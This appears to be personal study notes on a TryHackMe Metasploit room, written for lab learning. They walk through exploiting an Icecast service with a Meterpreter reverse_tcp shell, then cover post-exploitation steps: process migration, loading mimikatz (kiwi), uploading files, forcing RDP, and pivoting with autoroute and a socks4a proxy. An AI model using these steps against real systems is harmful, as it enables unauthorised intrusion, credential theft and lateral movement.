# Metasploit - part of the red primer series

- Metasploit the all powerful pentesters tool (so ive been hearing). Let me also learn to use it, might be useful after all. OOh fuck my data connection is fucking up again :(.
Really having a hard time with my connection to the internet this days. What exactly is happening.????????????

- Learnt to use metasploit help command 

### Modules for every ocassion

[!](https://github.com/ctf-me/TryHackMe/metasploit.jpg)

- Metasploit is absolutely very useful and can save my ass alot if i take my time to learn it. Actually not in the modd to do anything like notes today. But i want to talk to myself thoo.
But on the real metasploit is hella powerful, herh very powerful. See how im just escalating priveledges like a boss.
But one thing i'm scared of is that i wouldn't know how stuff works if i keep interacting with it with metasploit.
 - I think i'll still prefer doing the recons and exploitations manually for now, to get some learning into my sytem.
 
### Move that shell

1.  Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command `'db_nmap -sV BOX-IP'` 
```
db_nmap -sV $IP
```

- Let's go ahead and see what information we have collected in the database. Try typing the command 'hosts' into the msfconsole now.

- How about something else from the database, try the command 'services' now.

- One last thing, try the command `'vulns'` now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully.
 
2. Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type `'use'` followed by a unique string found within only the target exploit. For example, try this out now with the following command `'use icecast'`. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start
```
exploit/windows/http/icecast_header
```

- Now type the command `'use NUMBER_FROM_PREVIOUS_QUESTION'`. This is the short way to use modules returned by search results. 

- Next, let's set the payload using this command `'set PAYLOAD windows/meterpreter/reverse_tcp'`. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command `'set LHOST YOUR_IP_ON_TRYHACKME'`. You might have to check your IP using the command `'ip addr'`, it will likely be your tun0 interface.

- Let's go ahead and return to our previous exploit, run the command `use icecast` to select it again.

-  One last step before we can run our exploit. Run the command `'set RHOSTS BOX_IP'` to tell Metasploit which target to attack. 

- Once you're set those variables correctly, run the exploit now via either the command `'exploit'` or the command 'run -j' to run this as a job.

- Once we've started this, we can check all of the jobs running on the system by running the command `jobs`

- After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`



### We're in, now what?

1.  First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command 'ps'. What's the name of the spool service? 
```
spoolsv.ex
```

2.  Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try! 
```
migrate
```

3. Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?
```
getuid
```

4. How about finding more information out about the system itself?
```
sysinfo
```

5. This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it? 
```
load kiwi

load -l [list all extensions]
```

6. Let's go ahead and figure out the privileges of our current user, what command do we run?
```
getprivs
```

7. What command do we run to transfer files to our victim computer? 
```
upload
```

8. How about if we want to run a Metasploit module?
```
run
```

9.  A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim? 
```
ipconfig
```

- Let's go ahead and run a few post modules from Metasploit. First, let's run the command `run post/windows/gather/checkvm`. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.

- Next, let's try: `run post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges. Feel free to experiment using these suggestions, however, we'll be going through this in greater detail in the room `Ice`.

- Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`

9. One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell? 
```
shell
```

### Making Cisco proud!

1. Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.
```
run autoroute -h 
Output:
meterpreter > run autoroute -h

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module


run autoroute -s 10.1.1.0 -n 255.255.255.0
```

2. Additionally, we can start a socks4a proxy server out of this session. Background our current meterpreter session and run the command `search server/socks4a`. What is the full path to the socks4a auxiliary module?
```
auxiliary/server/socks4a
```

3. Once we've started a socks server we can modify our /etc/proxychains.conf file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks4a server with proxychains?
```
proxychains
```
